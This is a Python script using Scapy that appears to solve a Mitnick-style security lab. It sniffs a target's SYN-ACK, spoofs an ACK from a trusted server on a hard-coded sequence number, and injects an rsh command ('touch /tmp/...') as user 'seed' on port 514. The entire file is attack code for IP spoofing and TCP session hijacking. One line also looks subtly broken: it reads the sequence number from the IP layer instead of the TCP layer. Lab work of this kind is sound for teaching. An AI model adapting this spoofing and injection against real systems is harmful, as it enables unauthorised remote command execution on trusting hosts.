from scapy.all import *

server_ip = "10.0.2.9"
server_port=1023

x_terminal_ip = "10.0.2.7"
x_terminal_port = 514
	
def sniff_spoof(pkt):
	previous_packet_ip = pkt[IP]
	previous_packet_tcp = pkt[TCP]

	tcp_len = previous_packet_ip.len - previous_packet_ip.ihl*4 - previous_packet_tcp.dataofs*4 
	print("{}:{} -> {}:{} Flags={} Len={}".format(previous_packet_ip.src, previous_packet_tcp.sport, previous_packet_ip.dst, previous_packet_tcp.dport, previous_packet_tcp.flags, tcp_len))

	if previous_packet_tcp.flags =="SA":
		print("Sending ACK Packet")
		ip = IP(src = server_ip, dst = x_terminal_ip)
		tcp= TCP(sport = server_port, dport = x_terminal_port, flags = "A", seq = 1955201956, ack = previous_packet_ip.seq + 1)
		send (ip/tcp, verbose=0)

		print("Sending RSH Packet")
		data = '9090\x00seed\x00seed\x00touch /tmp/20i1955\x00'
		send(ip/tcp/data, verbose=0)


pkt = sniff(filter = "tcp and src host 10.0.2.7", prn =sniff_spoof)
